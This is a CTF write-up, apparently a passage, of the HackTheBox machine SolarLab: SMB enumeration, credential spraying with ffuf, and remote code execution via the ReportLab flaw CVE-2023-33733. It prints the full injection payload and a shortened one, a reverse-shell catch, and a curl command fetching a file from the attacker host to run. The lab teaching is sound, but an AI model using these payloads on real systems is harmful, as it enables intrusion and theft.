---
title: HTB: SolarLab
url: https://0xdf.gitlab.io/2024/09/21/htb-solarlab.html
date: 2024-09-21T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, hackthebox, htb-solarlab, nmap, windows, flask, feroxbuster, netexec, password-spray, ffuf, reportlab, cve-2023-33733, openfire, runascs, cve-2023-32315, chisel, tunnel, openfire-plugin, psexec, htb-jab
---

![SolarLab](/img/solarlab-cover.png)

SolarLab starts with an SMB share with a spreadsheet containing usernames and passwords. I’ll abuse a website that has different error messages for invalid user and wrong password, as well as analysis of the username format to find a username and password combination that works on the site. Inside, I’ll abuse CVE-2023-33733 in reportlab PDF generation to get RCE and a shell. For the lateral movement, I’ll show two ways to get to the openfire user. The first is to find the database and a password and use RunasCS to get execution. The other is to abuse CVE-2023-32315 in OpenFire to create an admin user, and then upload a malicious plugin to get RCE. From there, I’ll decrypt another password in the OpenFire configuration that is also the administrator password.

## Box Info

| Name | [SolarLab](https://hackthebox.com/machines/solarlab)  [SolarLab](https://hackthebox.com/machines/solarlab) [Play on HackTheBox](https://hackthebox.com/machines/solarlab) |
| --- | --- |
| Release Date | [11 May 2024](https://twitter.com/hackthebox_eu/status/1788554553371054155) |
| Retire Date | 21 Sep 2024 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for SolarLab |
| Radar Graph | Radar chart for SolarLab |
| First Blood User | 00:24:32[Embargo Embargo](https://app.hackthebox.com/users/267436) |
| First Blood Root | 01:08:12[gumby gumby](https://app.hackthebox.com/users/187281) |
| Creator | [LazyTitan33 LazyTitan33](https://app.hackthebox.com/users/512308) |

## Recon

### nmap

`nmap` finds six open TCP ports, HTTP (80 and 6791), RPC (135), NetBios (139), SMB (445), and an unknown service on 7680:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.16
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-17 14:54 EDT
Nmap scan report for 10.10.11.16
Host is up (0.094s latency).
Not shown: 65529 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
6791/tcp open  hnm
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
oxdf@hacky$ nmap -p 80,135,139,445,6791,7680 -sCV 10.10.11.16
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-17 14:55 EDT
Nmap scan report for 10.10.11.16
Host is up (0.094s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-17T18:56:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.15 seconds

```

It’s a Windows box, but it’s running nginx on port 80 and port 6791. Both 80 and 6791 have redirects to `solarlab.htb` and `report.solarlab.htb` respectively. I’ll use `ffuf` to brute force other possible subdomains on both, but not find anything. I’ll add these to my `/etc/hosts` file:

```
10.10.11.16 solarlab.htb report.solarlab.htb

```

### Website - TCP 80

#### Site

The website is for a company that makes an instant messaging program:

![image-20240517151149144](/img/image-20240517151149144.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s a couple forms, but they don’t submit in a way that gives the impression that anything is happening with them.

#### Tech Stack / Directory Brute Force

The main page loads as `index.html`, another sign that this may be a static website. The HTTP response headers don’t show anything interesting.

The 404 page is the default nginx page.

I’ll run `feroxbuster` against the site, but it doesn’t find anything and then starts spitting tons of errors.

### ReportHub - TCP 6791

#### Site

The site on TCP 6791 offers a login form and calls itself ReportHub:

![image-20240517152545988](/img/image-20240517152545988.png)

I don’t have creds and basic injections don’t work. I will note the error message on a failed login:

![image-20240919131005477](/img/image-20240919131005477.png)

This implies that if the user exists but the password is wrong, the message might be different. I am not able to guess and valid users, but I’ll come back to this once I have usernames to check.

#### Tech Stack

Nothing too different in the HTTP response headers here:

```

HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Fri, 17 May 2024 19:23:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2045
Connection: close
Vary: Cookie

```

The 404 page matches the [default Flask 404 page](https://github.com/pallets/werkzeug/blob/5add63c955131fd73531d7369f16b2f1b4e342d4/src/werkzeug/exceptions.py#L340-L350):

![image-20240517152723754](/img/image-20240517152723754.png)

#### Directory Brute Force

`feroxbuster` works better here, finding a couple endpoints, but nothing that’s useful without authentication:

```

oxdf@hacky$ feroxbuster -u http://report.solarlab.htb:6791                 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://report.solarlab.htb:6791
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle 
off with --dont-filter
200      GET       85l      157w     2045c http://report.solarlab.htb:6791/
200      GET       85l      157w     2045c http://report.solarlab.htb:6791/login
302      GET        5l       22w      229c http://report.solarlab.htb:6791/logout => http://report.solarlab.htb:6
791/login?next=%2Flogout
302      GET        5l       22w      235c http://report.solarlab.htb:6791/dashboard => http://report.solarlab.ht
b:6791/login?next=%2Fdashboard
502      GET        7l       11w      157c http://report.solarlab.htb:6791/fence
502      GET        7l       11w      157c http://report.solarlab.htb:6791/fep
502      GET        7l       11w      157c http://report.solarlab.htb:6791/ferozo
...[snip]...

```

### SMB - TCP 445

#### List Shares

`netexec` is able to find the specific OS:

```

oxdf@hacky$ netexec smb solarlab.htb
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)

```

With an empty guest password it will show the shares:

```

oxdf@hacky$ netexec smb solarlab.htb -u guest -p '' --shares
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\guest: 
SMB         10.10.11.16     445    SOLARLAB         [*] Enumerated shares
SMB         10.10.11.16     445    SOLARLAB         Share           Permissions     Remark
SMB         10.10.11.16     445    SOLARLAB         -----           -----------     ------
SMB         10.10.11.16     445    SOLARLAB         ADMIN$                          Remote Admin
SMB         10.10.11.16     445    SOLARLAB         C$                              Default share
SMB         10.10.11.16     445    SOLARLAB         Documents       READ            
SMB         10.10.11.16     445    SOLARLAB         IPC$            READ            Remote IPC

```

It shows that the guest account can connect to the `Documents` share.

#### Documents

I’ll connect with `smbclient`. It appears to be a user’s home directory:

```

oxdf@hacky$ smbclient //solarlab.htb/Documents -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Apr 26 10:47:14 2024
  ..                                 DR        0  Fri Apr 26 10:47:14 2024
  concepts                            D        0  Fri Apr 26 10:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023

                7779839 blocks of size 4096. 1874229 blocks available

```

There are two more files in `concepts`:

```

smb: \concepts\> ls
  .                                   D        0  Fri Apr 26 10:41:57 2024
  ..                                  D        0  Fri Apr 26 10:41:57 2024
  Training-Request-Form.docx          A   161337  Fri Nov 17 05:46:57 2023
  Travel-Request-Sample.docx          A    30953  Fri Nov 17 05:36:54 2023

                7779839 blocks of size 4096. 1874229 blocks available

```

I’ll get all the files.

#### Loot Evaluation

The two files from `concepts` are just template documents downloaded from the internet. There’s no interesting data in them. The same is true for `old_leave_request_form.docx`.

`details-file.xlxs` has information about various users and accounts:

[![image-20240517153625828](/img/image-20240517153625828.png)*Click for full size image*](/img/image-20240517153625828.png)

I’ll make note of the passwords especially.

#### Rid Cycle

I’ll use `netexec` to enumerate user account names on the host with a RID cycle attack:

```

oxdf@hacky$ netexec smb 10.10.11.16 -u guest -p '' --rid-brute
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\guest: 
SMB         10.10.11.16     445    SOLARLAB         500: SOLARLAB\Administrator (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         501: SOLARLAB\Guest (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         503: SOLARLAB\DefaultAccount (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         504: SOLARLAB\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         513: SOLARLAB\None (SidTypeGroup)
SMB         10.10.11.16     445    SOLARLAB         1000: SOLARLAB\blake (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         1001: SOLARLAB\openfire (SidTypeUser)

```

There’s an openfire user, which suggests the box may be using [Openfire](https://www.igniterealtime.org/projects/openfire/). There’s also a user named blake, which lines up with the passwords in the sheet.

#### Auth Check

I’ll check each of the passwords in the Excel file against the usernames I have so far. One works for blake:

```

oxdf@hacky$ netexec smb 10.10.11.16 -u blake -p passwords --continue-on-success
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\blake:al;ksdhfewoiuh STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\blake:dkjafblkjadsfgl STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\blake:d398sadsknr390 STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake:ThisCanB3typedeasily1@ 
oxdf@hacky$ netexec smb 10.10.11.16 -u openfire -p passwords --continue-on-success
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:al;ksdhfewoiuh STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:dkjafblkjadsfgl STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:d398sadsknr390 STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:ThisCanB3typedeasily1@ STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:danenacia9234n STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:dadsfawe9dafkn STATUS_LOGON_FAILURE 

```

Unfortunately, it doesn’t give any additional access beyond what I already have.

## Shell as blake

### ReportHub Login

#### Identify Users

With no luck on the server itself, I’ll focus on the website. I noted [above](#site-1) that the error message seems like it will help enumerate usernames. I’ll create a username list from the spreadsheet and spray it against the site with `ffuf`:

```

oxdf@hacky$ cat potential_user.txt 
Alexander.knight@gmail.com
KAlexander
Alexander.knight
blake.byte
AlexanderK
ClaudiaS
oxdf@hacky$ ffuf -u 'http://report.solarlab.htb:6791/login' -d 'username=FUZZ&password=asd' -w potential_user.txt -H "Content-Type: application/x-www-form-urlencoded"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://report.solarlab.htb:6791/login
 :: Wordlist         : FUZZ: /home/oxdf/hackthebox/solarlab-10.10.11.16/potential_user.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=asd
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Alexander.knight@gmail.com [Status: 200, Size: 2133, Words: 812, Lines: 87, Duration: 101ms]
AlexanderK              [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 106ms]
Alexander.knight        [Status: 200, Size: 2133, Words: 812, Lines: 87, Duration: 112ms]
blake.byte              [Status: 200, Size: 2133, Words: 812, Lines: 87, Duration: 112ms]
ClaudiaS                [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 113ms]
KAlexander              [Status: 200, Size: 2133, Words: 812, Lines: 87, Duration: 113ms]
:: Progress: [6/6] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

I’ll note that the size for “AlexanderK” and “ClaudiaS” is 2144, whereas the others are 2133! `ffuf` can filter (`-fs 2133`) to make that more clear:

```

oxdf@hacky$ ffuf -u 'http://report.solarlab.htb:6791/login' -d 'username=FUZZ&password=asd' -w potential_user.txt -H "Content-Type: application/x-www-form-urlencoded" -fs 2133

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://report.solarlab.htb:6791/login
 :: Wordlist         : FUZZ: /home/oxdf/hackthebox/solarlab-10.10.11.16/potential_user.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=asd
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2133
________________________________________________

AlexanderK              [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 109ms]
ClaudiaS                [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 110ms]
:: Progress: [6/6] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

If I try one of these, the error message is different:

![image-20240919131949057](/img/image-20240919131949057.png)

There’s also a blake.byte user that doesn’t exist. It’s worth checking that name in the naming style of first name plus last initial. It does exist.

#### Password Spray

I’ll create a file with the valid usernames, and grab the passwords from the sheet and create a list of possible passwords. I’ll use `ffuf` again, this time with:
- `-fs 2144` to hide “User authentication error” response.
- Both wordlists. In `ffuf`, adding `:[STRING]` after a wordlist tells `ffuf` to use that string instead of `FUZZ` as the replacement target.

It finds one valid set of creds:

```

oxdf@hacky$ ffuf -u 'http://report.solarlab.htb:6791/login' -d 'username=USER&password=PASS' -w report_users.txt:USER -w possible_passwords.txt:PASS -H "Content-Type: application/x-www-form-urlencoded" -fs 2144

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://report.solarlab.htb:6791/login
 :: Wordlist         : USER: report_users.txt
 :: Wordlist         : PASS: possible_passwords.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=USER&password=PASS
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2144
________________________________________________

[Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 152ms]
    * PASS: ThisCanB3typedeasily1@
    * USER: blakeb

:: Progress: [18/18] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

I’m able to log in as blakeb.

### Authed ReportHub Enumeration

Logged in, the page offers a few features:

![image-20240517155209474](/img/image-20240517155209474.png)

The “Leave Request” button goes to a form:

![image-20240517155303636](/img/image-20240517155303636.png)

Clicking “Generate PDF” leads to a PDF:

![image-20240517155356318](/img/image-20240517155356318.png)

It’s always good to see what kind of metadata ends up in a PDF generated by a website:

```

oxdf@hacky$ exiftool output.pdf 
ExifTool Version Number         : 12.40
File Name                       : output.pdf
Directory                       : .
File Size                       : 202 KiB
File Modification Date/Time     : 2024:05:17 15:54:21-04:00
File Access Date/Time           : 2024:05:17 15:54:22-04:00
File Inode Change Date/Time     : 2024:05:17 15:54:21-04:00
File Permissions                : -rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Author                          : (anonymous)
Create Date                     : 2024:05:17 22:53:02-02:00
Creator                         : (unspecified)
Modify Date                     : 2024:05:17 22:53:02-02:00
Producer                        : ReportLab PDF Library - www.reportlab.com
Subject                         : (unspecified)
Title                           : (anonymous)
Trapped                         : False
Page Mode                       : UseNone
Page Count                      : 1

```

The library used to make it is [ReportLab](https://www.reportlab.com/).

The other three request are almost exactly the same. For example:

![image-20240517155621146](/img/image-20240517155621146.png)

They each generate a similar PDF.

### CVE-2023-33733

#### Identify

Searching for “reportlab exploit” turns up information about CVE-2023-33733, a remote code execution vulnerability in ReportLab:

![image-20240517155854220](/img/image-20240517155854220.png)

#### POC

There’s [a POC](https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py) in the second link that shows Python code to exploit the `reportlab` library:

```

from reportlab.platypus import SimpleDocTemplate, Paragraph
from io import BytesIO
stream_file = BytesIO()
content = []

def add_paragraph(text, content):
    """ Add paragraph to document content"""
    content.append(Paragraph(text))

def get_document_template(stream_file: BytesIO):
    """ Get SimpleDocTemplate """
    return SimpleDocTemplate(stream_file)

def build_document(document, content, **props):
    """ Build pdf document based on elements added in `content`"""
    document.build(content, **props)

doc = get_document_template(stream_file)
#
# THE INJECTED PYTHON CODE THAT IS PASSED TO THE COLOR EVALUATOR
#[
#    [
#        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
#        for Word in [
#            orgTypeFun(
#                'Word',
#                (str,),
#                {
#                    'mutated': 1,
#                    'startswith': lambda self, x: False,
#                    '__eq__': lambda self, x: self.mutate()
#                    and self.mutated < 0
#                    and str(self) == x,
#                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
#                    '__hash__': lambda self: hash(str(self)),
#                },
#            )
#        ]
#    ]
#    for orgTypeFun in [type(type(1))]
#]

add_paragraph("""
            <para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>""", content)
build_document(doc, content)

```

Most of that is setting it up, the exploit itself this HTML that’s passed to the library:

```

<para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>

```

#### Character Limitations

The POC there is over 750 characters long. If I just to paste it into the form, it truncates:

![image-20240517162108295](/img/image-20240517162108295.png)

I’ll submit with a short payload and send the request to Burp Repeater. There I replace the short request with the payload, but it doesn’t return a PDF, but rather the form with an error message:

![image-20240517161203143](/img/image-20240517161203143.png)

This limit seems to apply to all the “Justification” fields.

### RCE

#### Two Methods

There are two methods from here I know of to get RCE:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[<a href="#reporthub-login">Access to\nReport Site</a>]-->B(<a href='#other-fields'>Other Fields</a>);
    B-->C[Shell as blake];
    A-->D(<a href='#shrink-payload'>Shrink Payload</a>);
    D-->C;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,3 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### Other Fields

When I send the request to repeater, I’ll leave the `user_input` fields at the bottom the same, but instead replace “Cybersecurity Awareness” with the payload, and update it to run `ping -n 1 10.10.14.6`:

![image-20240517162428815](/img/image-20240517162428815.png)

When I send this, the server responds with an HTTP 500 Internal Service Error, but there’s also an ICMP echo request at my listening `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:24:02.578332 IP 10.10.11.16 > 10.10.14.6: ICMP echo request, id 1, seq 10, length 40
16:24:02.578347 IP 10.10.14.6 > 10.10.11.16: ICMP echo reply, id 1, seq 10, length 40

```

This works for the phone number in the leave request, the training type in the training request, the address in the home office request, and the destination in the travel approval request.

With this method, I can use a long payload, like a PowerShell reverse shell from [revshells.com](https://www.revshells.com/):

![image-20240517163311613](/img/image-20240517163311613.png)

On sending, I get a shell:

```

oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.16 63912

PS C:\Users\blake\Documents\app>

```

I can grab `user.txt`:

```

PS C:\Users\blake\desktop> type user.txt
ed253e03************************

```

#### Shrink Payload

The author’s intended path was to shrink the payload. Starting with this:

```

<para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('ping 10.10.14.6') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>

```

I will:
- remove the whitespace, especially after commas and colons;
- remove the `<para>` tags;
- replace “exploit” with “e” and “red” with “r”;
- replace `False` with `0`;
- rename variables like `Word` as `w` and `orgTypeFun` as `o`;
- remove “and ‘r’” entirely;
- `mutated` and `mutate` are also defined here and can be shrunk to `m` and `M` respectively.

All of these changes gets the payload down to something like:

```

<font color="[[getattr(pow,W('__globals__'))['os'].system('ping 10.10.14.6')for W in [o('W',(str,),{'m':1,'startswith':lambda s,x:0,'__eq__':lambda s,x:s.M() and s.m<0 and str(s)==x, 'M':lambda s:{setattr(s,'m',s.m-1)},'__hash__':lambda s:hash(str(s))})]] for o in [type(type(1))]]">e</font>

```

When I paste this into `user_input` in Burp, the server returns a 500 error:

![image-20240919144728248](/img/image-20240919144728248.png)

But, there’s ICMP at my listening `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:49:39.639480 IP 10.10.11.16 > 10.10.14.6: ICMP echo request, id 1, seq 1, length 40
13:49:39.639488 IP 10.10.14.6 > 10.10.11.16: ICMP echo reply, id 1, seq 1, length 40
13:49:40.647740 IP 10.10.11.16 > 10.10.14.6: ICMP echo request, id 1, seq 2, length 40
13:49:40.647756 IP 10.10.14.6 > 10.10.11.16: ICMP echo reply, id 1, seq 2, length 40
13:49:41.653266 IP 10.10.11.16 > 10.10.14.6: ICMP echo request, id 1, seq 3, length 40
13:49:41.653283 IP 10.10.14.6 > 10.10.11.16: ICMP echo reply, id 1, seq 3, length 40
13:49:42.660647 IP 10.10.11.16 > 10.10.14.6: ICMP echo request, id 1, seq 4, length 40
13:49:42.660668 IP 10.10.14.6 > 10.10.11.16: ICMP echo reply, id 1, seq 4, length 40

```

I can replace `ping 10.10.14.6` with `curl 10.10.14.6/s -o s` to get a file and that works as well, which is enough to get a shell. I can grab a shell from [revshells.com](https://www.revshells.com/) and save it in a file, uploading that file and then executing it in two successive commands.

## Alternative Paths to openfire

There are two paths to get a shell as the openfire user:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[Shell as blake]-->B(<a href='#enumeration'>Find\nOpenfire DB</a>);
    B-->G(<a href="#runascs">RunasCs\nwith Creds</a>);
    G-->C[Shell as openfire];
    A-->E(<a href="#create-admin-user">CVE-2023-32315</a>);
    E-->D[OpenFire\nWeb Access];
    D-->F(<a href="#openfile-plugin-rce">Malicious\nOpenFire Plugin</a>);
    F-->C;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,3,4 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

I originally found the creds for the OpenFire user, while the author intended for me to exploit CVE-2023-32315 and write a plugin. I’ll show both.

## Shell as openfire via Creds

### Enumeration

#### OpenFire

As suspected, Openfire is installed on the host:

```

PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/16/2023   9:39 PM                Common Files
d-----         4/26/2024   4:39 PM                Internet Explorer
d-----        11/17/2023  10:04 AM                Java
d-----        11/16/2023   9:47 PM                Microsoft Update Health Tools
d-----         12/7/2019  11:14 AM                ModifiableWindowsApps
d-----        11/17/2023   2:22 PM                Openfire
d-----         4/26/2024   2:38 PM                RUXIM
d-----          5/3/2024   2:34 PM                VMware
d-----        11/16/2023  11:12 PM                Windows Defender
d-----         4/26/2024   4:39 PM                Windows Defender Advanced Threat Protection
d-----        11/16/2023  10:11 PM                Windows Mail
d-----        11/16/2023  10:11 PM                Windows Media Player
d-----         4/26/2024   4:39 PM                Windows Multimedia Platform
d-----         12/7/2019  11:50 AM                Windows NT
d-----        11/16/2023  10:11 PM                Windows Photo Viewer
d-----         4/26/2024   4:39 PM                Windows Portable Devices
d-----         12/7/2019  11:31 AM                Windows Security
d-----         12/7/2019  11:31 AM                WindowsPowerShell

```

As blake, I’m not able to access it.

#### Application

The shell as blake lands in the `C:\Users\blake\Documents\app` directory. This is where the code for the Report Hub application lives.

```

PS C:\Users\blake\Documents\app> ls  
    Directory: C:\Users\blake\Documents\app

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/2/2024  12:30 PM                instance
d-----         5/17/2024  11:16 PM                reports
d-----        11/17/2023  10:01 AM                static
d-----        11/17/2023  10:01 AM                templates
d-----         5/17/2024  11:44 PM                __pycache__
-a----        11/17/2023   9:59 AM           1278 app.py
-a----        11/16/2023   2:17 PM            315 models.py
-a----        11/18/2023   6:59 PM           7790 routes.py
-a----          5/2/2024   6:26 PM           3352 utils.py

```

At the top of `app.py`, there’s a reference to a SQLite database:

```

# app.py
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
import os

app = Flask(__name__)
app.secret_key = os.urandom(64)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'c:\\users\\blake\\documents\\app\\reports'
login_manager = LoginManager(app)
login_manager.login_view = 'login'

# Import other modules with routes and configurations
from routes import *
from models import User, db
from utils import create_database

db.init_app(app)

with app.app_context():
   create_database()

# Initialize Flask-Login
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

app.route('/')(index)
app.route('/login', methods=['GET', 'POST'])(login)
app.route('/logout')(logout)
app.route('/dashboard')(dashboard)
app.route('/leaveRequest', methods=['GET', 'POST'])(leaveRequest)
app.route('/trainingRequest', methods=['GET', 'POST'])(trainingRequest)
app.route('/homeOfficeRequest', methods=['GET', 'POST'])(homeOfficeRequest)
